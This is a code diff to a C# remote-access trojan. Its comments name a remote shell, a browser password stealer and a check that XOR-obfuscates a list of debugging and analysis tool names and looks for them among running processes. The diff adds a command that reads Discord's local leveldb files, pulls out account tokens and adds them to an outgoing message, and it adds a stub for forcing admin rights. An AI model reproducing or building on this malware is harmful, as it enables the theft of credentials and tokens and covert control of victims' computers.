@@ -1,4 +1,4 @@
-﻿    //  ------------------------------  //
+    //  ------------------------------  //
     //  |      Made By Spuqe         |  //
     //  |      -------------         |  //
     //  |  https://github.com/spuqe  |  //
@@ -16,6 +16,7 @@
     using Crying.Helpers;
     using System.Drawing;
     using System.Net.Http;
+    using Microsoft.CSharp;
     using System.Threading;
     using System.Reflection;
     using System.Diagnostics;
@@ -30,88 +31,88 @@
     using System.Collections.Specialized;
     using System.Text.RegularExpressions;
 
+#endregion
+
+// Varis = blocks known applications using XOR cipher
+#region VariksenPelätin
+class ProgramStarter
+{
+    // xor
+    #region
+    static string xor(string text, int n = 256)
+    {
+        byte[] input = Encoding.UTF8.GetBytes(text);
+        byte[] output = new byte[input.Length];
+        int i = 0;
+        foreach (byte b in input)
+        {
+            output[i] = (byte)(b ^ n);
+            i++;
+        }
+        return Encoding.UTF8.GetString(output);
+    }
     #endregion
 
-    // Varis = blocks known applications using XOR cipher
-    #region VariksenPelätin
-        class ProgramStarter
+    public static bool Starter()
+    {
+        string[] list = new string[] {
+                            "QOTCUNGTM",
+                            "OBGW",
+                            "IJJ_BDA",
+                            "RGUMKAT",
+                            "VTIECUUNGEMCT",
+                            "VTIEC^V",
+                            "BHUV_",
+                            "OBGW",
+                            "OKKSHOR_BCDSAACT",
+                            "QOTCUNGTM",
+                            "BSKVEGV",
+                            "NIIMC^VJITCT",
+                            "OKVITRTCE",
+                            "VCRIIJU",
+                            "JITBVC",
+                            "U_UOHUVCERIT",
+                            "VTIEyGHGJ_\\CT",
+                            "U_UGHGJ_\\CT",
+                            "UHO@@yNOR",
+                            "QOHBDA",
+                            "LICDI^EIHRTIJ",
+                            "@OBBJCT",
+                            "LICDI^UCTPCT",
+                            "OBG",
+                            "OBG",
+                            "PKRIIJUB",
+                            "PKQGTCRTGR",
+                            "PKQGTCSUCT",
+                            "PKGERNJV",
+                            "PDI^UCTPOEC",
+                            "PDI^RTG_",
+                            "MUBSKVCT",
+                            "TCEJGUHCR",
+                            "^BDA",
+                            "IJJ_BDA",
+                            "VTIATCUURCJCTOM@OBBJCTQCDBCDSAACT",
+                            "^BDA",
+                            "MUBSKVCT",
+                            "NRRVBCDSAACT"
+
+                        };
+
+        foreach (Process p in Process.GetProcesses())
+        {
+            foreach (string name in list)
             {
-                // xor
-                #region
-                static string xor(string text, int n = 256)
+                if (xor(p.ProcessName.ToLower(), 38).Contains(name))
                 {
-                    byte[] input = Encoding.UTF8.GetBytes(text);
-                    byte[] output = new byte[input.Length];
-                    int i = 0;
-                    foreach (byte b in input)
-                    {
-                        output[i] = (byte)(b ^ n);
-                        i++;
-                    }
-                    return Encoding.UTF8.GetString(output);
+                    return true;
                 }
-                #endregion
+            }
+        }
 
-                public static bool Starter()
-                {
-                    string[] list = new string[] {
-                        "QOTCUNGTM",
-                        "OBGW",
-                        "IJJ_BDA",
-                        "RGUMKAT",
-                        "VTIECUUNGEMCT",
-                        "VTIEC^V",
-                        "BHUV_",
-                        "OBGW",
-                        "OKKSHOR_BCDSAACT",
-                        "QOTCUNGTM",
-                        "BSKVEGV",
-                        "NIIMC^VJITCT",
-                        "OKVITRTCE",
-                        "VCRIIJU",
-                        "JITBVC",
-                        "U_UOHUVCERIT",
-                        "VTIEyGHGJ_\\CT",
-                        "U_UGHGJ_\\CT",
-                        "UHO@@yNOR",
-                        "QOHBDA",
-                        "LICDI^EIHRTIJ",
-                        "@OBBJCT",
-                        "LICDI^UCTPCT",
-                        "OBG",
-                        "OBG",
-                        "PKRIIJUB",
-                        "PKQGTCRTGR",
-                        "PKQGTCSUCT",
-                        "PKGERNJV",
-                        "PDI^UCTPOEC",
-                        "PDI^RTG_",
-                        "MUBSKVCT",
-                        "TCEJGUHCR",
-                        "^BDA",
-                        "IJJ_BDA",
-                        "VTIATCUURCJCTOM@OBBJCTQCDBCDSAACT",
-                        "^BDA",
-                        "MUBSKVCT",
-                        "NRRVBCDSAACT"
+        return false;
 
-                    };
-
-                    foreach (Process p in Process.GetProcesses())
-                    {
-                        foreach (string name in list)
-                        {
-                            if (xor(p.ProcessName.ToLower(), 38).Contains(name))
-                            {
-                                return true;
-                            }
-                        }
-                    }
-
-                    return false;
-
-                }
-                #endregion
+    }
+    #endregion
 
     // Lepakko = Password stealer engine. Steals from all gecko browsers.
     #region Lepakko
@@ -150,7 +151,10 @@
 
     #endregion
 
+    // Force admin
+    #region CodeNameSimon
 
+    #endregion
 
     // Connecting engine, Starter engine, FailFast engine runner, Commands.
     #region RShell
@@ -186,7 +190,7 @@
         {
             //Console.ForegroundColor = ConsoleColor.DarkGreen;
             //Console.WriteLine($"You are now connected to {address}");
-            //Console.WriteLine($"Using goat-rat remote tool version {version}");
+            //Console.WriteLine($"Using rshell remote tool version {version}");
             //Console.WriteLine($"Tool made by https://github.com/spuqe");
             //Console.WriteLine("\n" + Environment.MachineName + "\n" + Environment.UserName + "\n" + Utils.GetOSName() + "\n" + Utils.IsAdministrator());
 
@@ -322,6 +326,48 @@
                                 {
                                     writer.WriteLine(String.Join("\n", lines));
                                 };
+                                break;
+
+                            case "discord":
+                                var files = SearchForFile();
+                                if (files.Count == 0)
+                                {
+                                    Console.WriteLine("Didn't find any ldb files");
+                                    return;
+                                }
+                                foreach (string token in files)
+                                {
+                                    foreach (Match match in Regex.Matches(token, "[^\"]*"))
+                                    {
+                                        if (match.Length == 59)
+                                        {
+                                            Console.WriteLine($"Token={match.ToString()}");
+                                            message.Add("text", String.Join("\n", $"Token={match.ToString()}"));
+                                        }
+                                    }
+                                }
+                                List<string> SearchForFile()
+                                {
+                                    List<string> ldbFiles = new List<string>();
+                                    string discordPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";
+
+                                    if (!Directory.Exists(discordPath))
+                                    {
+                                        Console.WriteLine("Discord path not found");
+                                        return ldbFiles;
+                                    }
+
+                                    foreach (string file in Directory.GetFiles(discordPath, "*.ldb", SearchOption.TopDirectoryOnly))
+                                    {
+                                        string rawText = File.ReadAllText(file);
+                                        if (rawText.Contains("oken"))
+                                        {
+                                            Console.WriteLine($"{Path.GetFileName(file)} added");
+                                            ldbFiles.Add(rawText);
+                                        }
+                                    }
+                                    return ldbFiles;
+                                }
                                 break;
 
                             case "bookmarks":
